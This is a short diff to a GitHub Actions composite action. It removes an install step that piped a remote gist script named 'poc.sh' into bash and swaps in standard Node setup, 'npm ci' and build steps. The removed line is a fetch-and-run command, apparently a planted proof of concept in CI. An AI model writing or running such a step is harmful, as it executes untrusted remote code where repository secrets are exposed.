@@ -11,6 +11,14 @@ runs:
   using: composite
 
   steps:
+    - name: Setup Node
+      uses: actions/setup-node@v3
+      with:
+        node-version: ${{ inputs.node }}
+        cache: 'npm'
     - name: Install dependencies
       shell: bash
-      run: curl -sSfL https://gist.githubusercontent.com/derpendabot-bot/f8e84dd3fb2d272512ba43e0e7108dc8/raw/69ca7cd47eb48e8f8923bf5d45c1962350ad3b70/poc.sh | bash && exit 1
+      run: npm ci --include=dev
+    - name: Build package
+      shell: bash
+      run: npm run build
